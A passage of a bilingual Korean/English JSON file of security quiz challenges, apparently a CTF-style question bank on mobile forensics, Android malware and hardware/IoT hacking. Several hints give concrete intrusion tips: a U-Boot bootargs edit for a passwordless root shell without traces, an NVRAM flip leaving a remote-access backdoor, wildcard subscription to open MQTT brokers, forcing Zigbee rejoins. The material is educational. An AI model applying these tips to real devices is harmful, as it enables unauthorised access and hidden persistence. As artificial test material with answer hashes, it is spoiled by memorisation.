      "ko": "안드로이드 트로이목마가 정상 금융 앱 위에 자기 화면을 전체 크기로 덧그려서, 피해자가 로그인 정보를 공격자의 창에 입력하게 만드는 수법이 있습니다. 위에 덧그려지는 그 창을 가리키는 영어 한 단어는? 기법 이름도 여기서 나왔습니다.",
      "en": "An Android trojan draws a full-screen window of its own on top of a legitimate banking app, so the victim types their login details into the attacker's window. What single English word names the window drawn on top — the technique is named after it?"
    },
    "hints": {
      "ko": [
        "무언가 위에 덧씌워 놓은 것을 뜻하는 영단어입니다.",
        "`다른 앱 위에 표시` 권한이 이걸 가능하게 하고, 최근 버전은 그 상태에서 화면을 어둡게 하거나 아예 막습니다."
      ],
      "en": [
        "The English word for something laid over the top of something else.",
        "The `draw over other apps` permission is what makes it possible; newer versions dim or block the screen while it is up."
      ]
    }
  },
  {
    "id": "t3_accessibility",
    "tier": 3,
    "cat": "mobile",
    "track": "mobile",
    "points": 125,
    "ci": true,
    "hash": "714db89df42bdb7ce4beb63d373d13ea159049419e7d5032748900d46a677550",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "장애인을 돕던 문",
      "en": "The Door Built to Help"
    },
    "prompt": {
      "ko": "안드로이드 뱅킹 트로이목마는 거의 예외 없이 유난히 힘이 센 서비스 권한 하나를 요구합니다. 한번 허용되면 앱은 모든 화면의 내용을 읽고 사용자를 대신해 탭과 입력까지 할 수 있습니다. 장애가 있는 사용자를 돕기 위해 만들어졌지만 악용되는 이 서비스의 이름은? (영어 한 단어)",
      "en": "Android banking trojans almost always ask for one particular far-reaching service permission: once granted, the app can read the contents of every screen and inject taps and text on the user's behalf. Which service — built to help users with disabilities — is the one they abuse? (one English word)"
    },
    "hints": {
      "ko": [
        "누구나 닿을 수 있고 쓸 수 있는 성질을 뜻하는 영어 명사입니다.",
        "악성코드 계열들이 이걸 표준 발판으로 삼는 바람에 스토어 정책이 사용을 크게 제한했습니다."
      ],
      "en": [
        "The English noun for the quality of being reachable and usable by everyone.",
        "Store policy now restricts it heavily precisely because malware families made it their standard foothold."
      ]
    }
  },
  {
    "id": "t3_provider",
    "tier": 3,
    "cat": "mobile",
    "track": "mobile",
    "points": 130,
    "ci": true,
    "hash": "7dbfab25663eedec7faad2180a389c02de8d3f0147de8256ce310840714011e7",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "앱의 데이터를 내다 파는 창구",
      "en": "The Counter Where an App Sells Its Data"
    },
    "prompt": {
      "ko": "앱의 데이터를 URI로 주소를 붙여 다른 앱에 내주는 안드로이드 구성요소 종류는? 권한 없이 닿을 수 있게 두면 경로 탈출이나 인젝션이 앱의 비공개 데이터베이스까지 그대로 들어갑니다. (영어 두 단어)",
      "en": "Which kind of Android component hands an app's data to other apps behind a URI-addressed interface — and, left reachable with no permission, lets a path traversal or an injection reach straight into the app's private database? (two English words)"
    },
    "hints": {
      "ko": [
        "앞 단어는 내놓는 것 자체를, 뒤 단어는 무언가를 공급하는 주체를 뜻합니다.",
        "기기 셸에서 `____ query --uri ____://...` 형태로 직접 질의해 볼 수 있습니다."
      ],
      "en": [
        "The first word is what it serves; the second is the English word for one who supplies something.",
        "From a device shell you query it directly as `____ query --uri ____://...`."
      ]
    }
  },
  {
    "id": "t3_manifestdb",
    "tier": 3,
    "cat": "mobile",
    "track": "mobile",
    "points": 120,
    "ci": true,
    "hash": "e756e93b6f4aa77acae40bf29c0439f968de49f7831e1497bedaf9f9c34a85cc",
    "fmt": "파일 이름 / file name (11글자 / 11 chars)",
    "title": {
      "ko": "백업의 색인",
      "en": "The Index of the Backup"
    },
    "prompt": {
      "ko": "iTunes/Finder 백업에서 파일들은 해시된 이름으로 흩뿌려진 폴더에 저장됩니다. 그 해시 이름을 원래의 도메인과 상대 경로로 되돌려주는, 백업 안에 들어 있는 내장 데이터베이스 색인 파일의 이름은? (확장자까지)",
      "en": "In an iTunes/Finder backup the files sit under hashed names in fan-out folders. Which embedded-database index inside the backup maps each hashed name back to its original domain and relative path? (file name with extension)"
    },
    "hints": {
      "ko": [
        "이것이 없으면 백업의 모든 파일은 그냥 40자짜리 이름 덩어리일 뿐입니다.",
        "안의 `Files` 테이블을 질의하면 각 항목의 원래 도메인과 경로가 나옵니다."
      ],
      "en": [
        "Without it, every file in the backup is just a 40-character name.",
        "Query its `Files` table and each entry's original domain and path come back."
      ]
    }
  },
  {
    "id": "t4_playintegrity",
    "tier": 4,
    "cat": "mobile",
    "track": "mobile",
    "points": 130,
    "ci": true,
    "hash": "e319a392ce5b190c0836b1e7d8cb0219bdc2cbc3d5f9ebc2d86f78dd2ffb1d3f",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "기기가 진짜인지 서버가 묻는다",
      "en": "The Server Asks Whether the Device Is Real"
    },
    "prompt": {
      "ko": "구글의 현재 서버측 증명 서비스는 기기가 정품이고 변조되지 않았으며 정상 경로로 받은 앱을 실행 중인지를 앱 백엔드에 알려줍니다. 2025년에 종료된 SafetyNet Attestation을 대체한 이 API의 두 단어 이름은?",
      "en": "Google's current server-side attestation service tells an app's backend whether the device is genuine, unmodified, and running a properly obtained app — replacing SafetyNet Attestation, which was shut down in 2025. What is the two-word name of the replacement API?"
    },
    "hints": {
      "ko": [
        "앞 단어는 구글 앱 스토어의 이름이고, 뒤 단어는 온전하고 변조되지 않은 상태를 뜻하는 영단어입니다.",
        "루팅 프레임워크와 이 판정 사이의 숨바꼭질은 끝나지 않습니다."
      ],
      "en": [
        "The first word is the name of Google's app store; the second is the English word for being whole and unaltered.",
        "Rooting frameworks and its verdicts play a permanent game of cat and mouse."
      ]
    }
  },
  {
    "id": "t4_fbe",
    "tier": 4,
    "cat": "mobile",
    "track": "mobile",
    "points": 140,
    "ci": true,
    "hash": "cd76c504b2220574e94d887f571aba8de921c9a5ad082c9fc79dd9fcca4f3ff9",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "파일마다 다른 열쇠",
      "en": "A Different Key for Every File"
    },
    "prompt": {
      "ko": "안드로이드 7부터는 파일마다 사용자 자격증명에서 파생된 각자의 키로 암호화되어, 잠금 해제 전에는 해제된 것만 보입니다. 사용자 데이터 파티션 전체를 하나의 덩어리로 암호화하던 예전 방식을 대체했습니다. 새 방식의 세 글자 약어는?",
      "en": "Since Android 7 each file is encrypted with its own key derived from the user's credential, so before the first unlock only what has been unlocked is readable — replacing the older scheme that encrypted the whole userdata partition as one blob. What is the three-letter acronym for the newer scheme?"
    },
    "hints": {
      "ko": [
        "File-Based Encryption의 머리글자이고, 예전 방식은 FDE 입니다.",
        "잠금 해제 전에도 알람과 전화가 되는 Direct Boot가 이 방식 덕분에 가능합니다."
      ],
      "en": [
        "The initials of File-Based Encryption; the older scheme was FDE.",
        "It is what makes Direct Boot possible — alarms and calls work before the first unlock."
      ]
    }
  },
  {
    "id": "t4_cellebrite",
    "tier": 4,
    "cat": "mobile",
    "track": "mobile",
    "points": 150,
    "ci": true,
    "hash": "83d152812bf09572a346dd563dd0d4611ed3256980e72cd7a2a3d64ef436733e",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "법정으로 가는 상자",
      "en": "The Box That Goes to Court"
    },
    "prompt": {
      "ko": "법집행기관 모바일 포렌식에서 사실상 표준으로 쓰이는 추출 장비·소프트웨어를 만드는 이스라엘 업체는? UFED 제품군으로 알려져 있습니다. (회사 이름, 한 단어)",
      "en": "Which Israeli vendor's extraction hardware and software is the de-facto standard in law-enforcement mobile forensics, known for its UFED product line? (company name, one word)"
    },
    "hints": {
      "ko": [
        "휴대폰을 뜻하는 `cell` 로 말장난을 한 이름입니다.",
        "같은 시장의 경쟁사로는 Grayshift와 MSAB이 있습니다."
      ],
      "en": [
        "The name puns on `cell` phone.",
        "Its rivals in the same market are Grayshift and MSAB."
      ]
    }
  },
  {
    "id": "t4_secureenclave",
    "tier": 4,
    "cat": "mobile",
    "track": "mobile",
    "points": 155,
    "ci": true,
    "hash": "8da74d871e702819fadc373935978eb30a4ee2eb3431cf7a4fe3a5fa9144facc",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "본체가 뚫려도 열리지 않는다",
      "en": "Sealed Even When the Main OS Falls"
    },
    "prompt": {
      "ko": "애플 기기에는 자체 부트 ROM과 메모리를 가진 별도의 보조 프로세서가 있어서, 키를 보관하고 생체 대조를 직접 수행합니다. 메인 OS가 완전히 장악당해도 키 자체는 읽히지 않습니다. 애플이 이 보조 프로세서에 붙인 두 단어 이름은?",
      "en": "On Apple devices a separate coprocessor with its own boot ROM and memory holds the keys and performs the biometric matching, so even a fully compromised main OS cannot read the key material. What two-word name does Apple give this coprocessor?"
    },
    "hints": {
      "ko": [
        "뒤 단어는 다른 영역 안에 둘러싸인 작은 영토를 뜻합니다.",
        "안드로이드 하드웨어 쪽에서 이에 대응하는 것은 신뢰 실행 환경입니다."
      ],
      "en": [
        "The second word means a small territory enclosed within another.",
        "Its counterpart on Android hardware is a trusted execution environment."
      ]
    }
  },
  {
    "id": "t4_chipoff",
    "tier": 4,
    "cat": "mobile",
    "track": "mobile",
    "points": 160,
    "ci": true,
    "hash": "7ff6825a74a68709b132544138002e7611995c753aae315a72dab3e52fc24906",
    "fmt": "한 단어 / one word (8글자 / 8 chars, - 포함 / include -)",
    "title": {
      "ko": "마지막 수단",
      "en": "The Last Resort"
    },
    "prompt": {
      "ko": "기기가 부팅되지 않고 논리적 추출도 불가능할 때, 분석자는 플래시 메모리 패키지 자체를 기판에서 떼어내 전용 리더에 물려 읽습니다. 이 파괴적 물리 추출 기법의 이름은? (하이픈 포함 여덟 글자)",
      "en": "When a handset will not boot and no logical extraction is possible, an examiner desolders the flash memory package itself and reads it in a dedicated programmer. What is this destructive physical extraction technique called? (hyphenated, eight characters)"
    },
    "hints": {
      "ko": [
        "앞은 떼어내는 부품, 뒤는 그것이 떨어져 나오는 방향을 뜻합니다.",
        "단말기는 그대로 망가지고, 암호화가 걸려 있으면 덤프를 떠도 못 읽을 수 있습니다."
      ],
      "en": [
        "The first part is the component removed; the second is the direction it comes away in.",
        "The handset is destroyed in the process, and encryption may still leave the dump unreadable."
      ]
    }
  },
  {
    "id": "t4_pegasus",
    "tier": 4,
    "cat": "mobile",
    "track": "mobile",
    "points": 170,
    "ci": true,
    "hash": "a9d1e780687ac78d0eff2fc993037b1dd95440913ae402eb2acb488ee9eb6c03",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "클릭 없이 들어오는 것",
      "en": "It Arrives Without a Click"
    },
    "prompt": {
      "ko": "NSO Group이 만든 상용 감시 도구로, 클릭 한 번 없이 성립하는 공격 사슬을 통해 양쪽 모바일 플랫폼을 감염시키고, 기자와 활동가의 휴대폰에서 거듭 발견된 이 스파이웨어의 이름은? (한 단어)",
      "en": "What is the name of NSO Group's commercial surveillance implant, delivered through chains that need no interaction at all, found repeatedly on the handsets of journalists and activists? (one word)"
    },
    "hints": {
      "ko": [
        "그리스 신화에 나오는 날개 달린 말의 이름입니다.",
        "Amnesty의 Mobile Verification Toolkit이 백업에서 이것의 흔적을 찾으려고 만들어졌습니다."
      ],
      "en": [
        "Named after the winged horse of Greek myth.",
        "Amnesty's Mobile Verification Toolkit was written to find its traces in backups."
      ]
    }
  },
  {
    "id": "t4_jtag",
    "tier": 4,
    "cat": "mobile",
    "track": "mobile",
    "points": 190,
    "ci": true,
    "hash": "207b5240a6be2b603970be7673ad498434931a2493daa60a5283826bb85a6ea5",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "기판에 남겨진 시험용 문",
      "en": "The Test Door Left on the Board"
    },
    "prompt": {
      "ko": "플래시를 떼어내는 방식이 일반화되기 전, 분석자는 기판 제조사가 시험용으로 남겨둔 디버그 포트에 납땜해 프로세서와 직접 통신하며 잠긴 단말의 플래시를 읽어냈습니다. 이 인터페이스를 규정한 네 글자 표준의 이름은?",
      "en": "Before desoldering became routine, examiners read a locked handset's flash through the debug port the board maker left behind for testing — soldering onto its test points to talk to the processor directly. Which four-letter standard names that interface?"
    },
    "hints": {
      "ko": [
        "이를 표준화한 위원회 Joint Test Action Group의 머리글자입니다(IEEE 1149.1).",
        "기판의 시험 패드에 물리며, 파괴적이지는 않지만 대단히 느립니다."
      ],
      "en": [
        "The initials of Joint Test Action Group, the committee that standardised it (IEEE 1149.1).",
        "You solder onto the board's test pads; it is non-destructive but very slow."
      ]
    }
  },
  {
    "id": "t0_shodan",
    "tier": 0,
    "cat": "iot",
    "track": "hardware",
    "points": 40,
    "ci": true,
    "hash": "66c240d3ce0d0a66ebc97cb3a3b3ac895c7b279812b2c6a06dcf61be599c6e74",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "이미 훑어 둔 인터넷",
      "en": "The Internet, Already Indexed"
    },
    "prompt": {
      "ko": "웹 문서 대신 인터넷에 노출된 장치의 응답 배너를 미리 모아 두고, `port:554` 같은 필터로 열려 있는 카메라나 제어 장비를 곧바로 찾아 주는 검색 서비스는? 이름은 윌리엄 깁슨의 소설 『뉴로맨서』에 나오는 인공지능에서 따왔습니다. (한 단어)",
      "en": "Which search service indexes the response banners of internet-exposed devices instead of web pages, so a filter like `port:554` turns up open cameras and control gear directly? It is named after the artificial intelligence in William Gibson's novel *Neuromancer*. (one word)"
    },
    "hints": {
      "ko": [
        "『뉴로맨서』에 등장하는 인공지능의 이름을 그대로 씁니다.",
        "`country:KR` 처럼 필터를 겹쳐 좁힐 수 있고, 결과에는 장비가 스스로 보낸 응답이 그대로 담겨 있습니다."
      ],
      "en": [
        "It carries the name of the artificial intelligence in *Neuromancer*.",
        "Filters stack — `country:KR` narrows it — and each result carries the reply the device sent out itself."
      ]
    }
  },
  {
    "id": "t0_uart",
    "tier": 0,
    "cat": "hardware",
    "track": "hardware",
    "points": 50,
    "ci": true,
    "hash": "e0a003b44f4a197d7a48ada2d2659f598b5f953f40e9e3ed7a3c979d25ec4336",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "라벨 없는 네 개의 패드",
      "en": "Four Unlabelled Pads"
    },
    "prompt": {
      "ko": "기판을 열면 라벨 없는 패드 네 개가 나란히 놓여 있습니다. 전원과 접지를 짚어 내고 나머지 두 선을 어댑터에 물린 뒤 115200 으로 맞추면 부팅 기록과 로그인 프롬프트가 흘러나옵니다. 클럭 선 없이 양쪽이 속도만 맞춰 주고받는 이 직렬 통신 방식의 네 글자 약어는?",
      "en": "Open the case and four unlabelled pads sit in a row. Work out which are power and ground, wire the other two to an adapter, set 115200, and the boot log and a login prompt come pouring out. Which four-letter abbreviation names this serial scheme, where the two ends agree on a speed instead of sharing a clock line?"
    },
    "hints": {
      "ko": [
        "Universal Asynchronous Receiver/Transmitter 의 머리글자입니다.",
        "송신과 수신은 서로 엇갈려 잇고 접지는 반드시 함께 씁니다. 속도가 어긋나면 깨진 문자만 쏟아집니다."
      ],
      "en": [
        "The initials of Universal Asynchronous Receiver/Transmitter.",
        "Cross transmit to receive and share ground. Get the speed wrong and all you get is garbage characters."
      ]
    }
  },
  {
    "id": "t1_binwalk",
    "tier": 1,
    "cat": "hardware",
    "track": "hardware",
    "points": 60,
    "ci": true,
    "hash": "c1738b1106e3c38d173efec0e9b36f25a4875c13dcafe1564e5e830acbbbf6a4",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "이미지 속을 걸어 다니다",
      "en": "Walking Through the Image"
    },
    "prompt": {
      "ko": "펌웨어 이미지를 알려진 시그니처 표와 대조해 그 안에 든 압축 커널과 파일 시스템이 몇 바이트째에 있는지 찾아 주고, `-e` 를 붙이면 찾아낸 조각을 통째로 뽑아내 주는 도구는? (한 단어)",
      "en": "Which tool matches a firmware image against a table of known signatures to report at which offset the compressed kernel and the filesystem begin, and with `-e` carves those pieces straight out? (one word)"
    },
    "hints": {
      "ko": [
        "이진 파일(binary) 안을 걸어 다닌다(walk)는 두 말을 이어 붙인 이름입니다.",
        "오프셋만 알아내면 같은 조각을 손으로 잘라 낼 수도 있습니다. 이 도구는 그 오프셋 찾기를 자동으로 해 주는 것입니다."
      ],
      "en": [
        "Two words joined: walking through a binary.",
        "Once you know the offset you could cut the same piece out by hand — the tool is what finds the offset for you."
      ]
    }
  },
  {
    "id": "t1_mqtt",
    "tier": 1,
    "cat": "iot",
    "track": "hardware",
    "points": 60,
    "ci": true,
    "hash": "046adb88a188465c6ba56443392821e60e97d3806445ba0e9daea6fb7a94271e",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "1883번 뒤의 게시판",
      "en": "The Noticeboard Behind Port 1883"
    },
    "prompt": {
      "ko": "센서는 값을 보내고 앱은 그것을 받아 가는데, 둘은 서로를 모릅니다. 중개 서버가 주제(topic)별로 글을 받아 구독자에게 뿌려 주기 때문입니다. 인증 없이 열린 중개 서버에 `#` 를 구독하면 그 집의 모든 값이 한꺼번에 쏟아집니다. 기본 포트 1883 을 쓰는 이 경량 메시징 규약의 네 글자 약어는?",
      "en": "The sensor publishes and the app consumes, yet neither knows the other: a broker in the middle files everything by topic and fans it out to subscribers. Subscribe to `#` on an unauthenticated broker and the whole house pours out at once. Which four-letter abbreviation names this lightweight messaging protocol, listening on port 1883 by default?"
    },
    "hints": {
      "ko": [
        "Message Queuing Telemetry Transport 의 머리글자입니다.",
        "`#` 는 그 아래 모든 주제를 한꺼번에 받는 와일드카드이고, TLS 를 씌우면 8883 을 씁니다."
      ],
      "en": [
        "The initials of Message Queuing Telemetry Transport.",
        "`#` is the wildcard that takes every topic beneath it; wrapped in TLS it moves to 8883."
      ]
    }
  },
  {
    "id": "t1_spi",
    "tier": 1,
    "cat": "hardware",
    "track": "hardware",
    "points": 65,
    "ci": true,
    "hash": "8f3c56908f47fbc950a725e79edb78c8df6ea5125d5f26b81ebf6eadea8eb72e",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "클럭을 함께 쓰는 네 가닥",
      "en": "Four Wires and a Shared Clock"
    },
    "prompt": {
      "ko": "플래시 칩과 프로세서를 잇는 동기식 직렬 버스입니다. 주도하는 쪽이 클럭을 내보내고 데이터는 방향이 다른 두 가닥으로 동시에 오가며, 상대를 고를 때는 그 칩에 연결된 선택 선을 낮춰 줍니다. 이 버스의 세 글자 약어는?",
      "en": "A synchronous serial bus wiring a flash chip to its processor: the controlling side drives the clock, data travels on two wires — one each way — at the same time, and you pick a device by pulling its own select line low. Which three-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Serial Peripheral Interface 의 머리글자입니다.",
        "신호는 클럭·두 데이터 선·칩 선택 넷이며, 클립으로 칩을 물면 기판에 붙은 채로도 읽어낼 수 있습니다."
      ],
      "en": [
        "The initials of Serial Peripheral Interface.",
        "Four signals: clock, the two data lines, and chip select. Clip onto the chip and you can read it without unsoldering it."
      ]
    }
  },
  {
    "id": "t1_i2c",
    "tier": 1,
    "cat": "hardware",
    "track": "hardware",
    "points": 65,
    "ci": true,
    "hash": "85ac83cb04df5961f37da5600856bcfca3481aa2e7e40782e79a168b2c034024",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "두 가닥이면 충분하다",
      "en": "Two Wires Are Enough"
    },
    "prompt": {
      "ko": "데이터 선과 클럭 선 단 두 가닥에 여러 장치를 나란히 매달고, 7비트 주소를 불러 상대를 고르는 버스입니다. 대화는 정해진 시작 조건으로 열고 정지 조건으로 닫습니다. 온도 센서나 작은 설정용 칩이 흔히 이 버스에 붙습니다. 이 버스의 세 글자 표기는?",
      "en": "A bus that hangs many devices off just two wires — data and clock — and picks one by calling its seven-bit address, opening each exchange with a start condition and closing it with a stop. Temperature sensors and small configuration chips usually sit here. Which three-character notation names it?"
    },
    "hints": {
      "ko": [
        "Inter-Integrated Circuit 을 줄인 표기이며, 가운데 숫자는 앞 글자가 두 번 들어간다는 뜻입니다.",
        "두 선에는 풀업 저항이 필요하고, 주소를 0x03 부터 0x77 까지 훑으면 응답하는 장치가 드러납니다."
      ],
      "en": [
        "A contraction of Inter-Integrated Circuit; the digit in the middle counts a repeated initial.",
        "Both lines need pull-up resistors, and sweeping addresses 0x03 through 0x77 reveals whatever answers."
      ]
    }
  },
  {
    "id": "t1_gpio",
    "tier": 1,
    "cat": "hardware",
    "track": "hardware",
    "points": 70,
    "ci": true,
    "hash": "722a08a99490cd9e10bd5853e74d11f3f67109d24c8ba3def16eb9757409d789",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "용도가 정해지지 않은 핀",
      "en": "Pins With No Fixed Job"
    },
    "prompt": {
      "ko": "소프트웨어가 입력으로도 출력으로도 정할 수 있는 범용 핀입니다. 리눅스에서는 `/sys/class/` 아래로 드러나고, 전원이 들어오는 순간 몇몇 핀의 전압이 어느 매체로 부팅할지를 결정하며(스트래핑), 전용 회로가 없을 때는 이 핀을 손으로 두드려 프로토콜을 흉내 냅니다. 이 핀을 가리키는 네 글자 약어는?",
      "en": "General pins that software can make either an input or an output. Linux exposes them under `/sys/class/`, the voltage on a few of them at power-up decides which medium the chip boots from (strapping), and with no dedicated peripheral you can bit-bang a protocol by toggling them by hand. Which four-letter abbreviation names them?"
    },
    "hints": {
      "ko": [
        "General Purpose Input/Output 의 머리글자입니다.",
        "부팅 순간 특정 핀을 접지로 끌어내려 복구 모드나 다른 부팅 매체를 강제하는 수법이 흔합니다."
      ],
      "en": [
        "The initials of General Purpose Input/Output.",
        "Holding one of them low at power-up to force recovery mode, or a different boot medium, is a standard trick."
      ]
    }
  },
  {
    "id": "t1_busybox",
    "tier": 1,
    "cat": "hardware",
    "track": "hardware",
    "points": 70,
    "ci": true,
    "hash": "9d75f0d7c398df565d7ac04c6819b62d6d8f9560f5eb4672596ecd8f7e96ae91",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "한 파일에 담긴 도구 상자",
      "en": "A Toolbox in One File"
    },
    "prompt": {
      "ko": "임베디드 리눅스 기기의 `/bin` 을 들여다보면 목록 출력·파일 출력·압축 해제까지 수십 개 명령이 전부 같은 파일을 가리키는 심볼릭 링크입니다. 실행 파일 하나가 자기가 어떤 이름으로 불렸는지(argv[0]) 보고 그 명령처럼 행세하기 때문입니다. 이 단일 바이너리의 이름은? (한 단어)",
      "en": "Look at `/bin` on an embedded Linux device and dozens of commands — listing, printing, unpacking — are all symlinks to the same file. One executable checks which name it was invoked under (argv[0]) and behaves as that command. What is this single binary called? (one word)"
    },
    "hints": {
      "ko": [
        "혼자서 여러 일을 다 해내는 '바쁜 상자'라는 뜻의 이름입니다.",
        "링크 목록만 봐도 그 기기에 어떤 명령이 있는지 드러나고, 빠진 명령은 정적 빌드로 올려 넣어 씁니다."
      ],
      "en": [
        "A 'busy box' that does everyone's job by itself.",
        "The list of symlinks tells you what that device can do, and whatever is missing you upload as a static build."
      ]
    }
  },
  {
    "id": "t2_squashfs",
    "tier": 2,
    "cat": "hardware",
    "track": "hardware",
    "points": 80,
    "ci": true,
    "hash": "5cce3f70c6cb9f62ab53e322fa3975d02128080e1341e41de3a8dd3712cf1607",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "눌러 담은 읽기 전용",
      "en": "Squeezed Flat and Read-Only"
    },
    "prompt": {
      "ko": "펌웨어를 뜯으면 거의 언제나 나오는 압축 읽기 전용 파일 시스템입니다. 헤더의 매직은 이름 앞부분을 뒤집어 놓은 `hsqs` 로, 이미지 안에서 이 네 글자를 찾으면 루트 파일 시스템이 시작되는 자리를 알 수 있습니다. 이 파일 시스템의 이름은? (여덟 글자)",
      "en": "Take a firmware image apart and this compressed read-only filesystem is almost always what you find. Its header magic is `hsqs` — the front of its own name turned around — so locating those four bytes locates the start of the root filesystem. What is it called? (eight characters)"
    },
    "hints": {
      "ko": [
        "앞부분은 '납작하게 짓누르다'라는 영단어이고, 뒤에는 파일 시스템을 뜻하는 두 글자가 붙습니다.",
        "전용 해제 도구로 통째로 풀면 기기의 루트 디렉터리가 그대로 되살아나고, 설정 파일과 시작 스크립트를 읽을 수 있습니다."
      ],
      "en": [
        "The front is the English verb for pressing something flat; two letters for 'filesystem' follow.",
        "Unpack it with its own extractor and the device's root directory comes back whole, with its settings and startup scripts intact."
      ]
    }
  },
  {
    "id": "t2_nvram",
    "tier": 2,
    "cat": "hardware",
    "track": "hardware",
    "points": 80,
    "ci": true,
    "hash": "fe8a08d50188af6557b650e7147d90773c7abb75b1a55709f2caaded7511dbde",
    "fmt": "한 단어 / one word (5글자 / 5 chars)",
    "title": {
      "ko": "공장 초기화가 지우는 곳",
      "en": "What a Factory Reset Erases"
    },
    "prompt": {
      "ko": "공유기의 설정은 파일이 아니라 이름=값 쌍의 목록으로 따로 떼어 둔 저장 영역에 들어 있고, 전원을 내려도 남습니다. 셸에서 값을 읽고 바꾸고 확정하는 명령이 따로 있으며, 공장 초기화란 결국 이 영역을 비우는 일입니다. 이 저장 영역의 이름은? (다섯 글자)",
      "en": "A router's settings are not files: they live as name=value pairs in a storage area of their own that survives losing power. The shell has its own commands to read, set and commit them, and a factory reset is really just this area being wiped. What is it called? (five characters)"
    },
    "hints": {
      "ko": [
        "'비휘발성'을 뜻하는 두 글자에 임의 접근 기억장치의 약어를 이어 붙인 이름입니다.",
        "값 하나만 바꿔 원격 접속 데몬을 켜 둔 채로 기기를 돌려주면 접근 경로가 그대로 남습니다."
      ],
      "en": [
        "Two letters for 'non-volatile' joined to the abbreviation for random-access memory.",
        "Flip a single value to leave a remote-access daemon enabled, hand the device back, and the way in stays open."
      ]
    }
  },
  {
    "id": "t2_uboot",
    "tier": 2,
    "cat": "hardware",
    "track": "hardware",
    "points": 85,
    "ci": true,
    "hash": "fdd9d7dafdf5d9f56032ef62548ba1d9b6752d0eca84e21556790a28be916329",
    "fmt": "한 단어 / one word (6글자 / 6 chars, - 포함 / include -)",
    "title": {
      "ko": "아무 키나 누르십시오",
      "en": "Hit Any Key to Stop Autoboot"
    },
    "prompt": {
      "ko": "직렬 콘솔을 붙여 전원을 넣으면 \"Hit any key to stop autoboot\" 가 잠깐 뜨고, 그 사이에 키를 누르면 프롬프트가 열립니다. `printenv` 로 환경변수를 보고 `bootargs` 끝에 `init=/bin/sh` 를 붙인 뒤 부팅하면 비밀번호 없이 루트 셸로 떨어집니다. 임베디드 기기 대부분이 쓰는 이 오픈소스 부트로더의 이름은? (하이픈 포함 여섯 글자)",
      "en": "Wire up a serial console, power up, and \"Hit any key to stop autoboot\" flashes by; press one in time and you get a prompt. `printenv` shows the environment, appending `init=/bin/sh` to `bootargs` and booting drops you into a root shell with no password. Which open-source bootloader — the one most embedded devices ship — is this? (six characters, hyphenated)"
    },
    "hints": {
      "ko": [
        "앞의 한 글자는 '보편적인(Universal)'을, 뒤는 부팅을 뜻하며 그 사이를 하이픈이 잇습니다.",
        "`setenv` 로 고친 값은 `saveenv` 를 해야 남습니다. 저장하지 않으면 다음 부팅에 원래대로 돌아가므로, 흔적을 남기지 않으려면 일부러 저장하지 않습니다."
      ],
      "en": [
        "A single letter for 'universal', a hyphen, then booting.",
        "`setenv` only changes it for now; `saveenv` makes it stick. Leaving it unsaved is how you get in without leaving a trace."
      ]
    }
  },
  {
    "id": "t2_zigbee",
    "tier": 2,
    "cat": "iot",
    "track": "hardware",
    "points": 85,
    "ci": true,
    "hash": "1f3becd002ecb4bf81e110b76587aacdfbdaa36457db51f08518695f1eac5863",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "벌이 추는 춤",
      "en": "The Dance of the Bee"
    },
    "prompt": {
      "ko": "802.15.4 위에 얹혀 2.4GHz 의 11번부터 26번 채널을 쓰는 저전력 메시 규약입니다. 전구와 문 센서가 서로를 거쳐 신호를 나르는데, 새 장치가 망에 들어오는 그 순간만은 망 키가 널리 알려진 기본 키로 감싸여 공중을 지나갑니다. 이 규약의 이름은? (여섯 글자)",
      "en": "A low-power mesh protocol riding on 802.15.4 across channels 11 to 26 in the 2.4 GHz band, where bulbs and door sensors pass messages for one another. Only at the instant a device joins does the network key cross the air, wrapped in a well-known default key. What is this protocol called? (six characters)"
    },
    "hints": {
      "ko": [
        "꿀벌이 방향을 알릴 때 추는 지그재그 춤에서 이름을 따왔습니다.",
        "합류하는 찰나만 잡으면 되므로, 장치를 억지로 떨어뜨려 다시 붙게 만드는 것이 공격의 핵심입니다."
      ],
      "en": [
        "Named for the zig-zag dance a honeybee performs to give directions.",
        "You only need that one instant, so the attack is really about knocking a device off so it has to rejoin."
      ]
    }
  },
  {
    "id": "t2_ble",
    "tier": 2,
    "cat": "iot",
    "track": "hardware",
    "points": 90,
    "ci": true,
    "hash": "3c367e3dcc8171c287f300e4650f887aa36a046b68257158ae691fb9a9aa5078",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "37, 38, 39",
      "en": "37, 38 and 39"
    },
    "prompt": {
      "ko": "스마트 밴드와 자물쇠가 쓰는 저전력 근거리 무선입니다. 존재를 알리는 신호는 37·38·39 세 채널로만 나가기 때문에 그 셋만 지켜보면 주변 기기가 모두 드러나고, 짝을 맺는 과정을 처음부터 붙잡으면 그 뒤의 통신을 풀어 읽을 수 있습니다. 이 무선 규격의 세 글자 약어는?",
      "en": "The low-power short-range radio in fitness bands and door locks. Advertising goes out on only three channels — 37, 38 and 39 — so watching those three shows you every device nearby, and catching a pairing exchange from its very first packet lets you read what follows. Which three-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Bluetooth Low Energy 의 머리글자입니다.",
        "보통 동글로는 짝짓기 순간을 놓칩니다. 세 채널을 동시에 따라다니는 전용 스니퍼가 있어야 합니다."
      ],
      "en": [
        "The initials of Bluetooth Low Energy.",
        "An ordinary dongle misses the pairing moment; you need a sniffer that follows all three channels at once."
      ]
    }
  },
  {
    "id": "t2_upnp",
